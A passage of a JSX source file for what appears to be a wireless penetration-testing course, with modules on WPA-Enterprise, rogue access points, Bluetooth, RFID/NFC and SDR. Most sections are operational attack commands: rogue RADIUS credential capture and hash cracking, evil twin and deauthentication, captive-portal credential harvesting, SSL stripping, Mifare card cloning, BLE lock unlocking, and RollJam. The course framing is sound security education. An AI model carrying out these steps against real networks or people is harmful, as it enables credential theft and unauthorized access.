EAP Methods (ordered by attack difficulty):
  EAP-TLS       Hard  - mutual certificate auth, no password
  EAP-TTLS      Medium - TLS tunnel + inner method (PAP/MSCHAPv2)
  PEAP          Medium - TLS tunnel + MSCHAPv2 inner
  EAP-FAST      Medium - PAC provisioning weakness
  LEAP          Easy  - ancient, completely broken, MD5-based`}</Pre>

        <H3>PEAP-MSCHAPv2: The Critical Weakness</H3>
        <Pre label="// PEAP-MSCHAPv2 ATTACK SURFACE">{`Phase 1: TLS handshake (outer tunnel)
  - Client SHOULD validate server certificate CN and CA
  - Most enterprise deployments: client DOES NOT validate cert
  - This is the attack window

Phase 2: MSCHAPv2 exchange (inner tunnel - protected by TLS)
  - Server sends Challenge (16 bytes random)
  - Client computes NTLMv2 hash of password
  - Client sends ChallengeResponse (24 bytes)

  If attacker is the RADIUS server:
  - Attacker sees Challenge + ChallengeResponse
  - This is a valid NTLMv2 hash capture
  - Can be cracked offline or used in pass-the-hash

Why clients fail to validate certs:
  - Certificate validation disabled in supplicant config
  - Self-signed cert accepted by default
  - No CA bundle configured
  - User clicks "Accept" on cert warning popup
  - MDM pushed config without CA validation enabled`}</Pre>

        <H3>hostapd-wpe: Rogue RADIUS Setup</H3>
        <Pre label="// HOSTAPD-WPE CONFIGURATION">{`# Install hostapd-wpe
sudo apt install hostapd-wpe

# hostapd-wpe.conf (modify for your target):
# interface=wlan0mon
# driver=nl80211
# ssid=CORP_SSID_HERE
# hw_mode=g
# channel=CHANNEL_NUM
# wpa=2
# wpa_key_mgmt=WPA-EAP
# wpa_pairwise=CCMP
# ieee8021x=1
# eap_server=1
# eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
# ca_cert=/etc/hostapd-wpe/certs/ca.pem
# server_cert=/etc/hostapd-wpe/certs/server.pem
# private_key=/etc/hostapd-wpe/certs/server.key

# Start rogue enterprise AP
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials appear in terminal and log file:
# [PEAP] username: jsmith
# [PEAP] challenge: aa:bb:cc:dd:ee:ff:00:11
# [PEAP] response:  xx:xx:xx:xx:xx:xx:xx:xx...

# Format for hashcat:
# username::domain:challenge:response
# jsmith::DOMAIN:aabbccddeeff0011:xxxxxxxxxxxx...`}</Pre>

        <H3>eaphammer: Modern 802.1X Attack Framework</H3>
        <Pre label="// EAPHAMMER USAGE">{`# Clone and setup
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
sudo python3 eaphammer-setup

# Generate fake certificates matching target organization
sudo python3 eaphammer --cert-wizard

# Deploy rogue enterprise AP
sudo python3 eaphammer -i wlan0 \
  --channel CHANNEL_NUM \
  --auth wpa-eap \
  --essid "CORP_SSID_HERE" \
  --creds

# Capture and display credentials in real-time
# Automatically handles PEAP, EAP-TTLS, EAP-FAST

# Force specific EAP method (downgrade attack)
sudo python3 eaphammer -i wlan0 \
  --essid "CORP_SSID_HERE" \
  --auth wpa-eap \
  --eap-downgrade EAP-TTLS-PAP
# EAP-TTLS with PAP inner = plaintext password inside TLS tunnel`}</Pre>

        <H3>Cracking Captured NTLMv2 Hashes</H3>
        <Pre label="// CRACK NTLMv2 FROM ENTERPRISE WIFI">{`# Format: username::domain:ServerChallenge:ClientResponse:blob
# From hostapd-wpe log - reconstruct hash:
# username::DOMAIN:challenge:response:

# Crack with hashcat (mode 5500 = NTLMv2)
hashcat -m 5500 enterprise_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for corporate password complexity
hashcat -m 5500 enterprise_hashes.txt corporate_wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Crack with John
john --format=netntlmv2 enterprise_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt

# After cracking: plaintext AD credentials
# Use for:
#   - SMB access to shares
#   - RDP login
#   - Pass-the-hash (with NTLM hash, not NTLMv2)
#   - Kerberoasting from inside the domain`}</Pre>

        <H3>EAP-TLS and Certificate Attacks</H3>
        <Pre label="// EAP-TLS ATTACK SURFACE">{`# EAP-TLS uses mutual certificate authentication
# Client presents a certificate - much harder to attack
# Attack scenarios:

# 1. Stolen client certificate (physical access or malware)
openssl pkcs12 -in client.p12 -nodes -out client_key.pem

# 2. Compromised CA (internal PKI breach)
# If attacker has CA private key - sign any client cert

# 3. Certificate validation bypass in RADIUS server
# Misconfigured RADIUS accepting expired/revoked certs

# 4. MAC spoofing for 802.1X bypass
# Some networks use MAC Authentication Bypass (MAB) as fallback
# Sniff authorized MAC from network, spoof it
macchanger -m AA:BB:CC:DD:EE:FF INTERFACE_HERE

# 5. VLAN hopping after successful 802.1X
# If VLAN assignment is based on 802.1X identity
# Forge EAP-Identity to claim different username -> different VLAN`}</Pre>

        <H3>Defending WPA-Enterprise</H3>
        <Note type="tip">The only bulletproof defense is EAP-TLS with client certificates and strict server certificate validation. If you must use PEAP-MSCHAPv2, enforce certificate pinning in the supplicant - configure the exact CA and server certificate that clients must accept, and disable any prompts that allow users to accept unknown certificates.</Note>
      </div>
    ),
  },
  {
    id: 'wl-05',
    title: 'Rogue AP & MITM Attacks',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    takeaways: [
      'The Karma attack exploits client probe requests - clients announce every network they have ever connected to in cleartext',
      'WiFi Pineapple automates Karma + deauth + SSL strip into a single hardware platform designed for targeted attacks',
      'SSID confusion (CVE-2023-52424) requires no deauth - exploits the lack of binding between SSID and network credentials',
      'SSL stripping is still effective against sites without HSTS preloading - a rogue AP can strip HTTPS from most traffic',
      'Captive portal attacks harvest credentials by mimicking legitimate login pages after intercepting HTTP traffic',
    ],
    content: (
      <div>
        <P>Rogue AP attacks create a malicious access point that clients connect to, placing the attacker in a man-in-the-middle position. The sophistication ranges from simple evil twin attacks to the Karma attack that exploits client probe behavior.</P>

        <H3>Evil Twin Attack Methodology</H3>
        <Pre label="// EVIL TWIN STEP BY STEP">{`# Prerequisites: two wireless interfaces
#   wlan0mon - monitor mode (for deauth and scanning)
#   wlan1     - rogue AP interface

# Step 1: Scan and identify target
sudo airodump-ng wlan0mon
# Note: SSID, BSSID, channel, client MACs

# Step 2: Deploy rogue AP on same channel as real AP
# Using hostapd:
# /tmp/rogue_ap.conf:
# interface=wlan1
# driver=nl80211
# ssid=SSID_HERE
# channel=CHANNEL_NUM
# hw_mode=g

sudo hostapd /tmp/rogue_ap.conf &

# Step 3: Set up DHCP for connecting clients
# /tmp/dnsmasq.conf:
# interface=wlan1
# dhcp-range=192.168.1.2,192.168.1.100,12h
# dhcp-option=3,192.168.1.1
# dhcp-option=6,192.168.1.1

sudo dnsmasq -C /tmp/dnsmasq.conf &

# Step 4: Configure IP and forwarding
sudo ip addr add 192.168.1.1/24 dev wlan1
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Step 5: Deauth clients from real AP (force them to your rogue AP)
sudo aireplay-ng -0 0 -a BSSID_HERE wlan0mon`}</Pre>

        <H3>Karma Attack</H3>
        <Pre label="// KARMA ATTACK: PROBE REQUEST EXPLOITATION">{`# Client probe request behavior:
# When not connected, clients broadcast: "Is SSID_HERE here?"
# These are called probe requests
# They reveal every network the client has ever connected to
# An attacker hearing these can respond YES to any request

# Passive SSID enumeration from probes
sudo airodump-ng wlan0mon
# "Probes" column shows client preferred network list

# Karma attack: respond to all probe requests
# hostapd-wpe implements Karma by default
# OR use mdk4:
mdk4 wlan0mon p -t CLIENT_MAC_HERE -s SSID_HERE

# WiFi Pineapple PineAP module automates this:
# - Responds to all probe requests with matching SSID
# - Logs all observed SSIDs from probes
# - Builds profile of client device roaming history

# Why it works:
# Client connects to "Starbucks_WiFi" automatically
# because it connected there once 6 months ago
# No user interaction required`}</Pre>

        <H3>WiFi Pineapple</H3>
        <Table
          headers={['Module', 'Function', 'Attack Use']}
          rows={[
            ['PineAP', 'SSID broadcast + Karma', 'Auto-associate victims from probe history'],
            ['Deauth', 'Targeted deauthentication', 'Force clients off real AP to rogue AP'],
            ['Filters', 'Client/AP whitelist/blacklist', 'Limit attack to target clients only'],
            ['Recon', 'Network scanning + client tracking', 'Map environment, identify targets'],
            ['Evil Portal', 'Captive portal deployment', 'Credential harvesting via login page'],
            ['SSLsplit', 'TLS interception proxy', 'Decrypt HTTPS traffic (without HSTS)'],
          ]}
        />

        <H3>Bettercap WiFi Module</H3>
        <Pre label="// BETTERCAP WIFI MITM">{`# Start bettercap
sudo bettercap -iface wlan0

# In bettercap interactive console:
# Scan for WiFi networks
wifi.recon on

# Show discovered APs
wifi.show

# Deauthenticate all clients on target AP
wifi.deauth BSSID_HERE

# Create evil twin (requires second interface wlan1)
set wifi.ap.ssid SSID_HERE
set wifi.ap.bssid BSSID_HERE
set wifi.ap.channel CHANNEL_NUM
set wifi.ap.encryption WPA2
wifi.ap on

# SSL stripping
set ssl.strip.strip true
ssl.strip on

# ARP spoofing (post-association)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# DNS spoofing
set dns.spoof.domains TARGET_DOMAIN_HERE
set dns.spoof.address 192.168.1.1
dns.spoof on

# HTTP proxy for credential capture
http.proxy on`}</Pre>

        <H3>Captive Portal Credential Harvesting</H3>
        <Pre label="// CAPTIVE PORTAL ATTACK SETUP">{`# Redirect all HTTP traffic to credential harvesting page
# Using dnsmasq for DNS redirection
# /tmp/captive_dnsmasq.conf:
# address=/#/192.168.1.1      (redirect ALL DNS to attacker IP)
# interface=wlan1

# Use nodogsplash or nginx for the portal
# nginx config: redirect 80 to /login
# /etc/nginx/sites-available/captive:
# server {
#   listen 80;
#   root /var/www/captive;
#   location / { try_files $uri $uri/ /index.html; }
#   location /login { ... log credentials ... }
# }

# Clone a realistic login page
# Target: hotel WiFi, airport WiFi, corporate SSO
# Tools: httrack, wget --mirror

# iptables: redirect all 80 traffic to portal
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080`}</Pre>
        <Note type="warn">Captive portal attacks require intercepting and logging user credentials. This is illegal without explicit authorization. In a penetration test, this requires specific scope authorization from the client.</Note>

        <H3>mitmproxy for Traffic Interception</H3>
        <Pre label="// MITMPROXY ON ROGUE AP">{`# After clients connect to rogue AP:
# Start mitmproxy in transparent mode
sudo mitmproxy --mode transparent \
  --listen-host 192.168.1.1 --listen-port 8080

# Or mitmweb for web UI
sudo mitmweb --mode transparent \
  --listen-host 192.168.1.1 --listen-port 8080

# Redirect traffic through mitmproxy
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
  -j REDIRECT --to-port 8080

# sslstrip for HTTP downgrade
sudo sslstrip -l 8080 -a -w sslstrip.log &

# View captured credentials in mitmproxy flows
# HTTPS: requires cert trust (social engineering or HSTS bypass)
# HTTP: fully visible in plaintext`}</Pre>
      </div>
    ),
  },
  {
    id: 'wl-06',
    title: 'Bluetooth & BLE Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '13 min',
    takeaways: [
      'Blueborne requires no pairing or user interaction - remote code execution purely over Bluetooth on unpatched Linux/Android',
      'KNOB attack forces Bluetooth entropy reduction to 1 byte, making brute force of the session key trivial in real time',
      'BLE GATT services often have unauthenticated read/write characteristics - IoT devices are rife with this misconfiguration',
      'GATTacker clones a BLE peripheral and becomes a transparent MITM between a real device and its app',
      'Ubertooth One can capture and decode Bluetooth Classic connections including Classic BR/EDR pairing',
    ],
    content: (
      <div>
        <P>Bluetooth is ubiquitous in modern environments - headphones, keyboards, mice, medical devices, industrial sensors, smart locks, and vehicles. Each category presents unique attack surfaces. Bluetooth Classic (BR/EDR) and BLE (Bluetooth Low Energy) have different protocols, security models, and attack techniques.</P>

        <H3>Bluetooth Classic vs BLE</H3>
        <Table
          headers={['Feature', 'Bluetooth Classic (BR/EDR)', 'Bluetooth Low Energy (BLE)']}
          rows={[
            ['Frequency', '2.4GHz, 79 channels, FHSS', '2.4GHz, 40 channels, FHSS'],
            ['Range', 'Up to 100m (Class 1)', 'Up to 400m line of sight'],
            ['Data Rate', '1-3 Mbps', '1-2 Mbps (5 Mbps with BT 5.0)'],
            ['Power', 'High', 'Extremely low'],
            ['Security', 'Pairing required, E0/AES', 'LE security modes 1-4, pairing optional'],
            ['Pairing', 'PIN, SSP (Secure Simple Pairing)', 'Just Works, Passkey, OOB, Numeric Comparison'],
            ['Use Cases', 'Audio, HID, serial', 'IoT sensors, beacons, wearables, medical'],
          ]}
        />

        <H3>Linux Bluetooth Stack (BlueZ)</H3>
        <Pre label="// BLUEZ BASIC COMMANDS">{`# List Bluetooth interfaces
hciconfig

# Bring up hci0 interface
hciconfig hci0 up

# Set discoverable
hciconfig hci0 piscan

# Scan for nearby devices
hcitool scan        # Classic devices
hcitool lescan      # BLE devices

# Get device info
hcitool info AA:BB:CC:DD:EE:FF

# Interactive Bluetooth management
bluetoothctl
  power on
  agent on
  scan on
  devices
  pair AA:BB:CC:DD:EE:FF
  connect AA:BB:CC:DD:EE:FF
  exit

# BTScanner - enumerate Classic Bluetooth
btscanner`}</Pre>

        <H3>BlueHydra: Device Tracking</H3>
        <Pre label="// BLUEHYDRA SETUP">{`# BlueHydra tracks both Classic and BLE devices
# Requires Ubertooth One for full passive capture
# Can use hci adapter for active scanning

git clone https://github.com/ZeroChaos-/blue_hydra
cd blue_hydra
bundle install

# Start with local adapter only (no Ubertooth)
sudo ruby bin/blue_hydra

# With Ubertooth for passive Classic BT capture
sudo ruby bin/blue_hydra --ubertooth

# BlueHydra builds a database of:
# - Device MAC addresses and names
# - Device types (phone, headset, keyboard, etc.)
# - Signal strength over time
# - Manufacturer from OUI database
# Useful for mapping a target environment's Bluetooth landscape`}</Pre>

        <H3>Ubertooth One: Bluetooth Sniffing</H3>
        <Pre label="// UBERTOOTH COMMANDS">{`# Ubertooth One: SDR-based BT sniffer ($120 hardware)
# Can capture Bluetooth Classic BR/EDR on the air

# Spectrum analysis
ubertooth-specan

# Follow a Classic BT connection
ubertooth-rx -U

# Capture to file for Wireshark
ubertooth-rx -U -d capture.pcap

# BLE passive scanning
ubertooth-btle -f -c capture.pcap

# Crack BT PIN from captured pairing
ubertooth-crack`}</Pre>

        <H3>BLE GATT Attack Surface</H3>
        <Pre label="// BLE GATT ENUMERATION AND ATTACKS">{`# Install gatttool and bleno
sudo apt install bluez

# Connect to BLE device and enumerate GATT services
gatttool -b AA:BB:CC:DD:EE:FF -I
  > connect
  > primary                          # List all services
  > characteristics                  # List all characteristics
  > char-read-hnd 0x0003             # Read characteristic by handle
  > char-write-req 0x0003 01         # Write to characteristic

# Key GATT concepts:
# Service UUID:      Groups related functionality
# Characteristic:   Data endpoint with properties (read/write/notify)
# Descriptor:       Metadata about characteristic

# Common IoT vulnerabilities:
# - Unauthenticated writes to control characteristics
# - No encryption on sensitive data characteristics
# - Device PIN/password stored in readable characteristic
# - Firmware update characteristic accepts unsigned firmware

# Example: smart lock with unauthenticated unlock
# Find lock control characteristic (usually proprietary UUID)
# Write unlock command without authentication
# gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0025 -n 01`}</Pre>

        <H3>GATTacker: BLE MITM</H3>
        <Pre label="// GATTACKER BLE MITM FRAMEWORK">{`# GATTacker: clone a BLE peripheral, act as transparent proxy
npm install -g gattacker

# Step 1: Scan and profile the real device
ws-sniff

# Step 2: Save device profile
# Creates JSON with all services, characteristics, descriptors

# Step 3: Become the device (clone)
ws-master -c DEVICE_PROFILE.json

# Result: attacker's device responds to the mobile app
# All reads/writes pass through attacker
# Can modify values in transit (e.g., change reported glucose levels)

# BtleJuice: similar framework with web UI
npm install -g btlejuice
btlejuice -u &        # Start UI server
btlejuice-proxy       # Start proxy`}</Pre>

        <H3>Blueborne (CVE-2017-0785 family)</H3>
        <Pre label="// BLUEBORNE ATTACK OVERVIEW">{`# Blueborne: 8 vulnerabilities across Android, Linux, Windows, iOS
# Critical: Linux kernel RCE and Android RCE without pairing

# Linux BlueBorne (CVE-2017-1000251)
# Stack overflow in L2CAP handling
# No pairing required - just Bluetooth enabled and discoverable

# Android BlueBorne (CVE-2017-0781, CVE-2017-0782)
# Heap overflow in BNEP protocol
# Any Android 5.0-7.1.2 without September 2017 patch

# Detection: devices must be discoverable OR recently active
# Exploit range: ~10m typical Bluetooth range

# Check patch status (Android)
# Settings -> About Phone -> Security Patch Level
# Need 2017-09-01 or later for Blueborne patches

# Mitigation:
# - Keep Bluetooth off when not in use
# - Apply security patches immediately
# - Disable discoverability`}</Pre>

        <H3>KNOB Attack: Key Negotiation of Bluetooth</H3>
        <Pre label="// KNOB ATTACK (CVE-2019-9506)">{`# KNOB: attacker forces Bluetooth entropy reduction during pairing
# Bluetooth Classic allows negotiating key length from 1-16 bytes
# Attacker sits between two pairing devices and forces 1-byte key

# Attack flow:
# 1. Alice and Bob are pairing Bluetooth Classic
# 2. KNOB attacker in range intercepts LMP_Encryption_Key_Size_Req
# 3. Attacker modifies request to suggest 1-byte entropy
# 4. Neither side rejects this (spec allows any length >= 1)
# 5. Session key is 1 byte (8 bits) = 256 possible keys
# 6. Attacker brute forces in real time
# 7. Full session decryption achieved

# KNOB test tool:
git clone https://github.com/francozappa/knob
# Requires Ubertooth One for passive capture

# Mitigation:
# RFC 3713 recommends minimum 7-byte key
# Android/iOS patched post-August 2019
# Check: Bluetooth controller firmware version`}</Pre>

        <H3>Flipper Zero: Multi-Protocol Attack Tool</H3>
        <Table
          headers={['Capability', 'Protocols', 'Attack Use']}
          rows={[
            ['Bluetooth', 'Classic + BLE', 'BLE spam attacks, device scanning, Badusb over BT'],
            ['Sub-GHz', '315/433/868/915MHz', 'RF signal capture and replay (key fobs, remotes)'],
            ['NFC', 'ISO 14443A, Mifare', 'Card reading, emulation, Mifare Classic attacks'],
            ['RFID', '125kHz LF', 'EM4100 card cloning, HID Prox reading'],
            ['iButton', '1-Wire', 'iButton key cloning'],
            ['IR', 'Infrared', 'Universal remote, IR signal capture/replay'],
            ['GPIO/UART', 'Serial protocols', 'Hardware hacking, BadUSB'],
          ]}
        />
      </div>
    ),
  },
  {
    id: 'wl-07',
    title: 'RFID, NFC & Physical Layer Attacks',
    difficulty: 'INTERMEDIATE',
    readTime: '14 min',
    takeaways: [
      'Mifare Classic uses the broken CRYPTO1 cipher - any card can be cloned with a Proxmark3 in under 2 minutes using hardnested',
      'EM4100 LF cards have no security at all - read-only ID is broadcast whenever a reader is nearby, trivial to clone',
      'Proxmark3 is the definitive RFID research tool - handles LF through HF with scriptable automation',
      'NFC relay attacks using NFCGate extend a card\'s effective range to any distance - bypass proximity assumptions entirely',
      'HID iCLASS SE and SEOS represent significantly harder targets than legacy Mifare Classic - migrate access control systems to these',
    ],
    content: (
      <div>
        <P>Physical access control systems rely heavily on RFID and NFC. The gap between card security and physical security assumptions is enormous - many organizations spend millions on physical barriers while using RFID cards that can be cloned in seconds from a meter away.</P>

        <H3>RFID Frequency Overview</H3>
        <Table
          headers={['Band', 'Frequency', 'Common Standards', 'Range', 'Security']}
          rows={[
            ['LF', '125-134kHz', 'EM4100, HID Prox, AWID, Indala', 'Up to 30cm', 'None - plain ID broadcast'],
            ['HF', '13.56MHz', 'Mifare, ISO 14443, ISO 15693, HID iCLASS', 'Up to 1m', 'Varies - Mifare Classic broken'],
            ['UHF', '860-960MHz', 'EPC Gen2, ISO 18000-6C', '1-12m', 'AES in some, weak in others'],
          ]}
        />

        <H3>Proxmark3: Core Tool</H3>
        <Pre label="// PROXMARK3 ESSENTIAL COMMANDS">{`# Start Proxmark3 client
proxmark3 /dev/ttyACM0
# OR in standalone mode on Proxmark3 Easy:
pm3

# Auto-detect card type (HF and LF)
[pm3] hf search
[pm3] lf search

# LF EM4100 card operations
[pm3] lf em 4x05 read           # Read EM4100 card
[pm3] lf em 4x05 info           # Detailed card info
[pm3] lf hid read               # Read HID Prox card

# Clone EM4100 to T5577 blank card
[pm3] lf em 4x05 clone --id ID_VALUE_HERE

# Mifare Classic operations
[pm3] hf mf info                # Card info + security analysis
[pm3] hf mf autopwn            # Automatic attack (darkside + nested)
[pm3] hf mf nested --blk 0 --kg --key FFFFFFFFFFFF   # Nested attack
[pm3] hf mf hardnested --tblk 0 --tk FFFFFFFFFFFF    # Hardnested

# Read all sectors after cracking
[pm3] hf mf dump --keys hf-mf-CARD_UID-key.bin

# Write to blank Mifare card (Magic Gen1a)
[pm3] hf mf cload -f hf-mf-CARD_UID-dump.bin

# NFC ISO 14443A operations
[pm3] hf 14a reader             # Read any 14A card
[pm3] hf 14a apdu -d 00A4040000 # Send raw APDU command`}</Pre>

        <H3>Mifare Classic Attack Chain</H3>
        <Pre label="// MIFARE CLASSIC COMPLETE ATTACK">{`# Mifare Classic: uses CRYPTO1 - a proprietary stream cipher
# CRYPTO1 was reverse engineered in 2008 and is completely broken

# Attack 1: Default keys (many cards still use factory defaults)
[pm3] hf mf chk --1k -k FFFFFFFFFFFF
[pm3] hf mf chk --1k -k 000000000000
[pm3] hf mf chk --1k -k A0A1A2A3A4A5

# Attack 2: Darkside attack (when no key is known)
# Exploits weak random number generator
# Requires several minutes
[pm3] hf mf darkside

# Attack 3: Nested attack (once ONE key is known)
# Uses the nonce relationship to derive other sector keys
[pm3] hf mf nested --blk 0 --kg --key FFFFFFFFFFFF --dump

# Attack 4: Hardnested (patched cards, only one key known)
# Works even on cards that fix the nested attack nonce issue
[pm3] hf mf hardnested --tblk 0 --tk SECTOR0_KEY_HERE --blk 4 --slow

# After cracking all keys: dump the entire card
[pm3] hf mf dump
# Creates: hf-mf-UID_HERE-dump.bin and hf-mf-UID_HERE-key.bin

# Clone to a magic card (writable UID)
[pm3] hf mf cload -f hf-mf-UID_HERE-dump.bin`}</Pre>

        <H3>ACR122U: Budget NFC Reader</H3>
        <Pre label="// ACR122U AND LIBNFC">{`# ACR122U: cheap (~$30) USB NFC reader, supported by libnfc
# Less capable than Proxmark3 but sufficient for basic NFC work

# Install libnfc
sudo apt install libnfc-bin libnfc-dev

# Scan for NFC tags
nfc-scan-device
nfc-list

# Poll for tags
nfc-poll

# Mifare Classic tools using libnfc
# mfoc: offline nested attack
mfoc -O dump.mfd

# mfcuk: Mifare Classic UK - correlation attack
mfcuk -C -R 0:A -s 250 -S 250 -O keys.mfd`}</Pre>

        <H3>NFC Relay Attack with NFCGate</H3>
        <Pre label="// NFC RELAY ATTACK">{`# NFC relay: extend card communication over any distance
# Use case: person A holds phone near access reader (attacker 1)
#           person B holds phone near victim's card (attacker 2)
#           Reader talks to card via relay - proximity assumption broken

# NFCGate architecture:
# Device 1 (reader side): reads NFC commands from access control reader
# Server:                 relays commands over internet
# Device 2 (card side):   sends commands to victim's card
# Response path is reversed

git clone https://github.com/nfcgate/nfcgate
# Install Android APK on both devices
# Configure server endpoint

# Requirements:
# - NFC-capable Android phones (NFC must be enabled on both)
# - Network connection between both phones
# - NFCGate app on both phones

# Limitation: adds ~100-300ms latency
# Most access control readers have tight timing windows
# Works on some readers, fails on others (timing dependent)`}</Pre>

        <H3>HID Access Control Systems</H3>
        <Table
          headers={['Technology', 'Security Level', 'Attack Difficulty', 'Notes']}
          rows={[
            ['HID Prox (LF)', 'None', 'Trivial', 'Read from 30cm with long-range reader'],
            ['Mifare Classic', 'Broken', 'Easy', 'CRYPTO1 - autopwn in minutes'],
            ['HID iCLASS (legacy)', 'Weak', 'Moderate', 'Master key attack, Proxmark3 tools'],
            ['HID iCLASS SE', 'AES', 'Hard', 'AES-128, no known practical attack'],
            ['HID SEOS', 'AES+PKI', 'Very Hard', 'Certificate-based, mobile-ready'],
            ['Mifare DESFire EV2', 'AES', 'Hard', 'AES-128, standard diversified keys'],
          ]}
        />
        <Note type="tip">Long-range LF RFID readers can capture EM4100 and HID Prox cards from 1+ meter away. These are commercially available and frequently used in "shoulder surfing" style attacks against access control readers in badge-required areas. Always perform RFID badge attacks as part of physical penetration testing scope.</Note>
      </div>
    ),
  },
  {
    id: 'wl-08',
    title: 'SDR & RF Signal Analysis',
    difficulty: 'INTERMEDIATE',
    readTime: '16 min',
    takeaways: [
      'RTL-SDR dongles ($25) can receive from 24MHz to 1.7GHz - sufficient for capturing most ISM band IoT signals',
      'RollJam defeats rolling codes by jamming the first press while recording, then replaying the jammed signal later',
      'Universal Radio Hacker automates signal demodulation and protocol reverse engineering from a pcap recording',
      'KillerBee targets Zigbee (802.15.4) networks - used widely in smart home and industrial automation environments',
      'LoRaWAN S0 session keys derived from weak root keys can be extracted and used to decrypt all traffic for that device',
    ],
    content: (
      <div>
        <P>Software Defined Radio moves signal processing from dedicated hardware to software. A cheap RTL-SDR dongle turns a PC into a spectrum analyzer, scanner, and with the right hardware additions, a transmitter. This enables analysis of virtually any wireless protocol not covered by WiFi/Bluetooth tools.</P>

        <H3>SDR Fundamentals</H3>
        <Pre label="// SDR CORE CONCEPTS">{`# IQ Samples: In-phase and Quadrature components
# Radio signal = carrier wave modulated with data
# SDR samples at much lower rate than carrier, captures IQ components
# I = real component, Q = imaginary component
# Together they represent both amplitude and phase

# Common modulation types:
# AM (Amplitude Modulation) - simple, easy to decode
# FM (Frequency Modulation) - more noise-resistant
# ASK (Amplitude Shift Keying) - OOK is simplest form (on/off)
# FSK (Frequency Shift Keying) - two frequencies = 0 and 1
# PSK (Phase Shift Keying) - phase changes encode data
# QAM (Quadrature Amplitude Modulation) - high bandwidth

# OOK (On-Off Keying) = binary ASK
# Used by: garage doors, keyfobs, weather stations, power meters
# Easiest to decode manually in SDR software`}</Pre>

        <H3>RTL-SDR Setup</H3>
        <Pre label="// RTL-SDR LINUX SETUP">{`# Install drivers (blacklist DVB driver first)
echo 'blacklist dvb_usb_rtl28xxu' | sudo tee /etc/modprobe.d/blacklist-rtl.conf
sudo apt install rtl-sdr

# Test device
rtl_test -t

# Basic reception - FM radio (validate your dongle works)
rtl_fm -f 101.5M -M fm -s 200k -r 44k | aplay -r 44k -f S16_LE

# GQRX: spectrum analyzer and receiver
sudo apt install gqrx-sdr
gqrx
# Configure: 2400000 sample rate, your center frequency

# SDR# (Windows)
# Download from airspy.com/download
# Configure RTL-SDR plugin, set gain, explore spectrum

# Calibrate your dongle's PPM offset
rtl_test -p 30    # Wait for stable PPM reading
# Apply offset in GQRX: gain/ppm setting`}</Pre>

        <H3>Universal Radio Hacker (URH)</H3>
        <Pre label="// URH PROTOCOL REVERSE ENGINEERING">{`# URH: record, analyze, and decode RF signals
sudo apt install universal-radio-hacker
urh

# Workflow:
# 1. Record signal: File -> Record Signal
#    Set sample rate, frequency, tune to target
#    Press record while triggering the device

# 2. Interpretation: Signal tab
#    Demodulate: select ASK/FSK/PSK
#    Adjust bit length until signal looks clean

# 3. Analysis: Analysis tab
#    URH auto-labels repeated fields
#    Identify: preamble, sync, device ID, command, checksum

# 4. Generate: Generator tab
#    Craft custom packets
#    Export to HackRF/YardStick for transmission

# From command line:
urh_cli -s signal.complex -c ASK -b 1000 -o decoded.txt`}</Pre>

        <H3>HackRF One and YARD Stick One</H3>
        <Table
          headers={['Device', 'Frequency', 'TX/RX', 'Primary Use']}
          rows={[
            ['RTL-SDR', '24MHz-1.7GHz', 'RX only', 'Passive monitoring, signal analysis'],
            ['HackRF One', '1MHz-6GHz', 'TX+RX (half duplex)', 'Full attack capability across all bands'],
            ['YARD Stick One', '300-928MHz', 'TX+RX', 'ISM band attacks (315/433/868/915MHz)'],
            ['LimeSDR', '100kHz-3.8GHz', 'TX+RX (full duplex)', 'Research, simultaneous TX+RX'],
            ['USRP B200', '70MHz-6GHz', 'TX+RX (full duplex)', 'Professional research platform'],
          ]}
        />
        <Pre label="// HACKRF BASIC USAGE">{`# Transmit a recorded signal file
hackrf_transfer -t signal.cs8 -f 433920000 -s 2000000 -x 40

# Receive and save to file
hackrf_transfer -r capture.cs8 -f 433920000 -s 8000000 -n 10000000

# YARD Stick One with RFCat
rfcat -r
# In rfcat console:
d.setFreq(433920000)      # Set frequency
d.setModulation(MOD_ASK_OOK)
d.makePktFLEN(50)
d.RFxmit('SIGNAL_BYTES_HERE')`}</Pre>

        <H3>RollJam: Rolling Code Defeat</H3>
        <Pre label="// ROLLJAM ATTACK">{`# Rolling codes (KeeLoq, etc.) change each button press
# Naive replay attack fails because code is already used
# RollJam exploits the fact that rolling code receivers
# accept the NEXT few codes in sequence

# RollJam hardware: two radios, one to jam, one to record
# Flipper Zero can approximate this for supported devices

# Attack sequence:
# Press 1: Attacker jams the signal, simultaneously records code_1
#           Car does NOT unlock (signal was jammed)
# Press 2: Attacker still jamming, records code_2
#           Car still does NOT unlock
#           Attacker NOW replays code_1
#           Car unlocks with code_1 (victim thinks it worked)
# Attacker has code_2 in reserve - valid for one future unlock

# Implementation with HackRF + GNU Radio:
# Flowgraph: source -> selector -> jam transmitter
#                   -> recorder -> replay buffer -> transmitter

# Why it works:
# Rolling code receivers accept codes within a window (e.g., next 256 codes)
# code_1 was never received by car, so it's still valid`}</Pre>

        <H3>Zigbee (802.15.4) Attacks</H3>
        <Pre label="// KILLERBEE FRAMEWORK">{`# KillerBee: Zigbee security research framework
# Hardware: RZUSBSTICK, ApiMote, or HackRF with Zigbee plugin
pip3 install killerbee

# Scan for Zigbee networks
zbstumbler -i /dev/ttyUSB0

# Capture Zigbee traffic to pcap
zbdump -i /dev/ttyUSB0 -c 11 -w zigbee.pcap -D

# Wireshark with Zigbee dissector
zbwireshark -i /dev/ttyUSB0 -c 11

# Replay captured packet
zbdump -i /dev/ttyUSB0 -r replay_this.pcap

# Zigbee security analysis:
# Zigbee Home Automation profile: pre-shared network key
# Often uses default key: ZigBeeAlliance09
# ZHA key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39

# Inject to network (requires key)
zbdump -i /dev/ttyUSB0 -c 11 --inject payload.pcap

# Zigbee key extraction from coordinator (physical access)
